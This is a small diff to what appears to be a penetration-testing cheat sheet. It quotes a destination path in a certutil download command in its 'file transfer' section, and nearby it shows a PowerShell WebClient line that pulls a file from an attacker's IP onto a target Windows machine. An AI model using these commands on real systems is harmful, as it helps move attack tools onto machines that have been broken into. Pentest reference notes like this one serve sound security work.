@@ -45,7 +45,7 @@ file transfer
 
 ```cmd
 # on target 
-certutil -urlcache -split -f "http://<target ip>/<file>" C:\Users\<User Account>\Desktop\<file>
+certutil -urlcache -split -f "http://<target ip>/<file>" "C:\Users\<User Account>\Desktop\<file>"
 PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
 ```
 
